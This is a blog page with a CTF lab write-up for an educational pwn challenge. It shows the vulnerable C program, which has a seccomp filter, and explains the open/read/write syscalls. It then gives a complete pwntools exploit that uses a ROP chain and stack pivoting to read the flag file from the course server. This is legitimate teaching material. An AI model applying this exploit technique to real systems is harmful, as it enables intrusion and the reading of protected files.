<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN - 0x10(seccomp/Lab - rop2win)
  #


  tags: CTF PWN eductf
  #

challenge: nc edu-ctf.zoolab.org 10005

  seccomp background
  #

Pwn week1

  Original Code
  #

:::spoiler
#include <stdio.h>
#include <unistd.h>
#include <seccomp.h>

char fn[0x20];
char ROP[0x100];


// fd = open("flag", 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --> stdout

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    printf("Give me filename: ");
    read(0, fn, 0x20);

    printf("Give me ROP: ");
    read(0, ROP, 0x100);

    char overflow[0x10];
    printf("Give me overflow: ");
    read(0, overflow, 0x30);

    return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)"><meta property="og:description" content='Simple PWN - 0x10(seccomp/Lab - rop2win) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10005
seccomp background # Pwn week1
Original Code # :::spoiler
#include <stdio.h> #include <unistd.h> #include <seccomp.h> char fn[0x20]; char ROP[0x100]; // fd = open("flag", 0); // read(fd, buf, 0x30); // write(1, buf, 0x30); // 1 --> stdout int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_load(ctx); seccomp_release(ctx); printf("Give me filename: "); read(0, fn, 0x20); printf("Give me ROP: "); read(0, ROP, 0x100); char overflow[0x10]; printf("Give me overflow: "); read(0, overflow, 0x30); return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#seccomp-background><code>seccomp</code> background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#row-background>ROW Background</a></li><li><a href=#exploit---rop--stack-pivoting>Exploit - <code>ROP</code> + stack pivoting</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x10seccomplab---rop2win>Simple PWN - 0x10(<code>seccomp</code>/Lab - <code>rop2win</code>)
<a class=anchor href=#simple-pwn---0x10seccomplab---rop2win>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10005</code></p><h2 id=seccomp-background><code>seccomp</code> background
<a class=anchor href=#seccomp-background>#</a></h2><p><a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;seccomp.h&gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&#34;flag&#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&gt; stdout

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    printf(&#34;Give me filename: &#34;);
    read(0, fn, 0x20);

    printf(&#34;Give me ROP: &#34;);
    read(0, ROP, 0x100);

    char overflow[0x10];
    printf(&#34;Give me overflow: &#34;);
    read(0, overflow, 0x30);

    return 0;
}
</code></pre><p>:::</p><ul><li>You can observe that it just allow <code>open</code>, <code>read</code>, <code>write</code> system call, so our goal is <font color=FF0000><strong>read the flag in the server</strong></font> by using these allowable system call.</li><li>It has global variable so that we can write <code>ROP</code> chain in it.</li><li>You also can analyze the sample <code>ELF</code> file by <code>seccomp-tools</code> if there is no source code<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ seccomp-tools dump ./chal
</span></span><span style=display:flex><span> line  CODE  JT   JF      K
</span></span><span style=display:flex><span><span style=color:#f92672>=================================</span>
</span></span><span style=display:flex><span> 0000: 0x20 0x00 0x00 0x00000004  A <span style=color:#f92672>=</span> arch
</span></span><span style=display:flex><span> 0001: 0x15 0x00 0x09 0xc000003e  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> ARCH_X86_64<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0011</span>
</span></span><span style=display:flex><span> 0002: 0x20 0x00 0x00 0x00000000  A <span style=color:#f92672>=</span> sys_number
</span></span><span style=display:flex><span> 0003: 0x35 0x00 0x01 0x40000000  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A &lt; 0x40000000<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0005</span>
</span></span><span style=display:flex><span> 0004: 0x15 0x00 0x06 0xffffffff  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> 0xffffffff<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0011</span>
</span></span><span style=display:flex><span> 0005: 0x15 0x04 0x00 0x00000000  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A <span style=color:#f92672>==</span> read<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0010</span>
</span></span><span style=display:flex><span> 0006: 0x15 0x03 0x00 0x00000001  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A <span style=color:#f92672>==</span> write<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0010</span>
</span></span><span style=display:flex><span> 0007: 0x15 0x02 0x00 0x00000002  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A <span style=color:#f92672>==</span> open<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0010</span>
</span></span><span style=display:flex><span> 0008: 0x15 0x01 0x00 0x0000003c  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A <span style=color:#f92672>==</span> exit<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0010</span>
</span></span><span style=display:flex><span> 0009: 0x15 0x00 0x01 0x000000e7  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> exit_group<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0011</span>
</span></span><span style=display:flex><span> 0010: 0x06 0x00 0x00 0x7fff0000  <span style=color:#66d9ef>return</span> ALLOW
</span></span><span style=display:flex><span> 0011: 0x06 0x00 0x00 0x00000000  <span style=color:#66d9ef>return</span> KILL
</span></span></code></pre></div></li></ul><h2 id=row-background>ROW Background
<a class=anchor href=#row-background>#</a></h2><ul><li><p>According to <a href=https://man7.org/linux/man-pages/man2/open.2.html>open(2) — Linux manual page</a>, it&rsquo;ll return <code>fd</code>(file descriptor).</p><blockquote><p>The open() system call opens the file specified by <code>pathname</code>. If the specified file does not exist, it may optionally (if O_CREAT is specified in flags) be created by open().</p></blockquote><blockquote><p>The return value of open() is a file descriptor, a small, <code>nonnegative</code> integer that is an index to an entry in the process&rsquo;s table of open file descriptors. The file descriptor is used in subsequent system calls (<code>read(2)</code>, <code>write(2)</code>, <code>lseek(2)</code>, <code>fcntl(2)</code>, etc.) to refer to the open file. The file descriptor returned by a successful call will be the lowest-numbered file descriptor not currently open for the process.</p></blockquote><ul><li>Note that, more info. about <code>fd</code> can refer to
<a href="https://youtu.be/d8ZN5-XTIJM?t=2093">Linux 核心設計: 檔案系統概念及實作手法 (上) - 34:53</a>,
<a href="https://youtu.be/d8ZN5-XTIJM?t=3509">Linux 核心設計: 檔案系統概念及實作手法 (上) - 58:29</a>,
<a href=https://wiyi.org/linux-file-descriptor.html>理解linux中的file descriptor(文件描述符)</a></li></ul></li><li><p>According to <a href=https://man7.org/linux/man-pages/man2/read.2.html>read(2) — Linux manual page</a></p><blockquote><p>read() attempts to read up to count bytes from file descriptor <code>fd</code> into the buffer starting at <code>buf</code>.</p></blockquote></li><li><p>According to <a href=https://man7.org/linux/man-pages/man2/write.2.html>write(2) — Linux manual page</a></p><blockquote><p>write() writes up to count bytes from the buffer starting at <code>buf</code> to the file referred to by the file descriptor fd.</p></blockquote></li><li><p>According to <a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>Linux System Call Table for x86 64</a></p><table><thead><tr><th style=text-align:center>%rax</th><th style=text-align:center>System Call</th><th style=text-align:center>%rdi</th><th style=text-align:center>%rsi</th><th style=text-align:center>%rdx</th><th style=text-align:center>%r10</th><th style=text-align:center>%r8</th><th style=text-align:center>%r9</th></tr></thead><tbody><tr><td style=text-align:center>0</td><td style=text-align:center>sys_read</td><td style=text-align:center>unsigned int fd</td><td style=text-align:center>char *buf</td><td style=text-align:center>size_t count</td><td style=text-align:center></td><td style=text-align:center></td><td></td></tr><tr><td style=text-align:center>1</td><td style=text-align:center>sys_write</td><td style=text-align:center>unsigned int fd</td><td style=text-align:center>const char *buf</td><td style=text-align:center>size_t count</td><td style=text-align:center></td><td style=text-align:center></td><td></td></tr><tr><td style=text-align:center>2</td><td style=text-align:center>sys_open</td><td style=text-align:center>const char *filename</td><td style=text-align:center>int flags</td><td style=text-align:center>int mode</td><td style=text-align:center></td><td style=text-align:center></td><td></td></tr></tbody></table><ul><li>Note that, flags argument in <code>sys_open</code> is:<blockquote><p>The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR. These request opening the file read-only, write-only, or read/write, respectively.</p></blockquote></li><li>mode argument can ignore</li></ul></li></ul><h2 id=exploit---rop--stack-pivoting>Exploit - <code>ROP</code> + stack pivoting
<a class=anchor href=#exploit---rop--stack-pivoting>#</a></h2><ol><li>Find the address of global variable that is <code>fn</code> and <code>ROP</code><pre tabindex=0><code class=language-bash! data-lang=bash!>$ objdump -d -M Intel chal | grep &#34;&lt;fn&gt;&#34;
40189c: 48 8d 05 9d 1a 0e 00    lea 0xe1a9d(%rip),%rax # 4e3340 &lt;fn&gt;
$ objdump -d -M Intel chal | grep &#34;&lt;ROP&gt;&#34;
4018c9: 48 8d 05 90 1a 0e 00    lea 0xe1a90(%rip),%rax # 4e3360 &lt;ROP&gt;
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>fn = 0x4e3340
ROP_addr = 0x4e3360
</code></pre></li><li>Find <code>ROP</code> gadget address<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --binary chal --multibr --only &#34;pop|syscall|ret|leave&#34; &gt; one_gadget
$ vim one_gadget
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>pop_rax_ret = 0x45db87
pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_rbx_ret = 0x493a2b
syscall_ret = 0x4284b6
leave_ret = 0x40190c
</code></pre></li><li>Construct <code>ROP</code> chain<pre tabindex=0><code class=language-python! data-lang=python!>ROP = flat(
   # Open filename
   # fd = open(&#34;flag&#34;, 0);
   pop_rax_ret, 2,
   pop_rdi_ret, fn,
   pop_rsi_ret, 0,
   syscall_ret,

   # Read the file
   # read(fd, buf, 0x30);
   pop_rax_ret, 0,
   pop_rdi_ret, 3,    # we can oversee the fd is 3 because 0,1,2 are preserved by default
   pop_rsi_ret, fn,
   pop_rdx_rbx_ret, 0x30, 0,
   syscall_ret,

   # Write the file
   # write(1, buf, 0x30); // 1 --&gt; stdout
   # the 2nd and 3rd argument are the same to read
   pop_rax_ret, 1,
   pop_rdi_ret, 1,
   syscall_ret,
   )
</code></pre></li><li>Write <code>ROP</code> chain to global variable(a new stack)<pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(&#34;Give me ROP:&#34;, b&#39;a&#39;*0x8 + ROP)
</code></pre><ul><li>Note that, you must try and error to observe how many bytes you have to overlap by trash such as <code>b'a'*0x8</code></li></ul></li><li>Stack pivoting<pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(&#39;Give me overflow:&#39;, b&#39;a&#39;*0x20 + p64(ROP_addr) + p64(leave_ret))
</code></pre><ul><li>Note that, you must try and error to observe how many bytes you have to overlap by trash such as <code>b'a'*0x20</code></li></ul></li><li>Where is the flag file in remote server?
You can build the docker and observe the relative position → <code>/home/chal/flag</code><pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(&#34;Give me filename:&#34;, &#39;/home/chal/flag\x00&#39;)
</code></pre></li><li>Then we got flag!!!
<img src=https://imgur.com/DdvxfZy.png alt></li></ol><ul><li>Whole exploit
:::spoiler code<pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

#r = process(&#39;./chal&#39;)
r = remote(&#39;edu-ctf.zoolab.org&#39;, 10005)
raw_input()
context.arch = &#39;amd64&#39;

fn = 0x4e3340
ROP_addr = 0x4e3360

pop_rax_ret = 0x45db87
pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_rbx_ret = 0x493a2b
syscall_ret = 0x4284b6
leave_ret = 0x40190c

ROP = flat(
   # Open filename
   pop_rax_ret, 2,
   pop_rdi_ret, fn,
   pop_rsi_ret, 0,
   syscall_ret,

   # Read the file
   pop_rax_ret, 0,
   pop_rdi_ret, 3,
   pop_rsi_ret, fn,
   pop_rdx_rbx_ret, 0x30, 0,
   syscall_ret,

   # Write the file
   pop_rax_ret, 1,
   pop_rdi_ret, 1,
   syscall_ret,
   )

r.sendafter(&#34;Give me filename:&#34;, &#39;/home/chal/flag\x00&#39;)
r.sendafter(&#34;Give me ROP:&#34;, b&#39;a&#39;*0x8 + ROP)
r.sendafter(&#39;Give me overflow:&#39;, b&#39;a&#39;*0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
</code></pre>:::</li></ul><h1 id=reference>Reference
<a class=anchor href=#reference>#</a></h1><p><a href=https://youtu.be/d8ZN5-XTIJM>Linux 核心設計: 檔案系統概念及實作手法 (上)</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#seccomp-background><code>seccomp</code> background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#row-background>ROW Background</a></li><li><a href=#exploit---rop--stack-pivoting>Exploit - <code>ROP</code> + stack pivoting</a></li></ul></nav></div></aside></main></body></html>